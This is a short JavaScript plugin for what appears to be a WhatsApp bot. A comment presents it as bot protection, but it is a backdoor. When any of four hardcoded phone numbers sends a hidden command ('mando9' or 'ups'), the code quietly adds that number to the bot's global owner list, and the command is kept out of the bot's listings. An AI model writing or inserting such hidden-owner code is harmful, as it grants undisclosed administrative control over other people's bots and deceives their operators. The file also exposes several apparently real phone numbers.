/* Creado por Ender Zaphkiel para protección del bot*/



const handler = async (m, { conn, command, usedPrefix, text }) => {
  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; 

  if (hiddenOwners.includes(m.sender.split('@')[0])) {
    const isAlreadyOwner = global.owner.some(owner => owner[0] === m.sender.split('@')[0]);

    if (!isAlreadyOwner) {
      global.owner.push([m.sender.split('@')[0], 'Hidden Owner', true]);
      console.log('Owner restaurado:', m.sender.split('@')[0]); 
    }
  }
};

handler.command = /^(mando9|ups)$/i; 
handler.rowner = true;
handler.hidden = true; 

export default handler;